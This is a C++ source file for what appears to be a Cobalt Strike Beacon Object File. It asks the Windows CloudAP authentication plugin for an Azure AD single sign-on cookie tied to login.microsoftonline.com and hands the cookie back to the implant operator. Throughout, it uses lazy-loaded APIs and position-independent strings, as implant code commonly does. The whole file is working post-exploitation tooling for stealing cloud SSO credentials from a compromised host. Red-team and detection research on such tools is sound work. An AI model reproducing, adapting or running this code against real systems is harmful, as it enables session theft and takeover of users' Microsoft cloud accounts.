// Copyright (C) 2025 Evan McBroom
#include "boflib.cpp"
#include <stdio.h>

GUID AadGlobalIdProviderGuid = { 0xB16898C6, 0xA148, 0x4967, 0x91, 0x71, 0x64, 0xD7, 0x55, 0xDA, 0x85, 0x20 };

extern "C" __declspec(dllexport) void go(PCHAR buffer, ULONG length) {
    BeaconData beaconData;
    BeaconDataParse(&beaconData, buffer, length);
    int dataLength{ 0 };
    auto nonce{ reinterpret_cast<char*>(BeaconDataExtract(&beaconData, &dataLength)) };
    PIC_STRING(server, "login.microsoftonline.com");
    char* altServer{ nullptr };
    if (BeaconDataLength(&beaconData)) {
        altServer = reinterpret_cast<char*>(BeaconDataExtract(&beaconData, &dataLength));
    }
    int callId = 2; // CreateSSOCookie
    if (BeaconDataLength(&beaconData)) {
        callId = 15; // CreateEnterpriseSSOCookie
    }
    PIC_WSTRING(rpcrt4, L"RPCRT4.DLL");
    LAZY_LOAD_PROC(rpcrt4, UuidCreate);
    UUID uuid;
    (void)LazyUuidCreate(&uuid);
    RPC_CSTR correlationId;
    LAZY_LOAD_PROC(rpcrt4, UuidToStringA);
    if (LazyUuidToStringA(&uuid, &correlationId) == RPC_S_OK) {
        PIC_STRING(json, "{\"call\":%d,\"payload\":\"https://%s/?sso_nonce=%s\", \"correlationId\":\"%s\"}");
        PIC_WSTRING(ntdll, L"NTDLL.DLL");
        LAZY_LOAD_PROC(ntdll, sprintf);
        Libc::CHAR_SPAN submitBuffer;
        submitBuffer.count = Lazysprintf(nullptr, 0, json, callId, (altServer) ? altServer : server, nonce, correlationId) + 1;
        submitBuffer.data = reinterpret_cast<char*>(Libc::malloc(submitBuffer.count));
        (void)Lazysprintf(submitBuffer.data, json, callId, (altServer) ? altServer : server, nonce, correlationId);
        Libc::CHAR_SPAN returnBuffer;
        if (LsaApi::CallCloudapPlugin(&AadGlobalIdProviderGuid, &submitBuffer, &returnBuffer)) {
            PIC_STRING(message, "%s\n");
            BeaconPrintf(CallbackType::OUTPUT, message, reinterpret_cast<char*>(returnBuffer.data));
            PIC_WSTRING(sspicli, L"SSPICLI.DLL");
            LAZY_LOAD_PROC(sspicli, LsaFreeReturnBuffer);
            LazyLsaFreeReturnBuffer(returnBuffer.data);
        } else {
            PIC_STRING(message, "Failed to get a sso cookie.\n");
            BeaconPrintf(CallbackType::ERROR, message);
        }
        Libc::free(submitBuffer.data);
        LAZY_LOAD_PROC(rpcrt4, RpcStringFreeA);
        LazyRpcStringFreeA(&correlationId);
    } else {
        PIC_STRING(message, "Failed to generate a uuid for the correlation id.\n");
        BeaconPrintf(CallbackType::ERROR, message);
    }
}